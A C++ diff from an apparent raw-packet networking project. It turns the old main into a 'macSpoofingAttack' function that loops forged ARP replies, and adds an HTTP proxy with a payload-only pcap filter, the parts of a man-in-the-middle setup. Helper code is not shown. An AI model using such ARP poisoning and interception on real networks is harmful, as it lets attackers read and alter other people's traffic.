@@ -1,5 +1,6 @@
 #include "Precompiled.h"
 #include "NetworkAssembler.h"
+#include "NetworkReact.h"
 #include <iostream>
 #include <memory>
 #include <Windows.h>
@@ -76,7 +77,7 @@ void createCustomPacketAndSend()
 	networkManager->SendPacket(ethernetHeader, ipHeader, tcpHeader, payload, 200);
 }
 
-auto main() -> int
+void macSpoofingAttack()
 {
 	auto networkAssembler = make_unique<NetworkAssembler>();
 	networkAssembler->PrintNetworkAdapters();
@@ -88,6 +89,18 @@ auto main() -> int
 		createArpReplyAndSend(networkAssembler.get(), targetMAC, L"10.0.0.17", targetMAC, L"10.0.0.15");
 		Sleep(10);
 	}
+}
+
+auto main() -> int
+{
+	auto assembler = make_unique<NetworkAssembler>();
+
+	assembler->PrintNetworkAdapters();
+	assembler->TargetAdapter(1);
+
+	auto react = make_unique<NetworkReact>(move(assembler));
+	
+	react->BeginProxy("tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)");
 
 	return 0;
 }
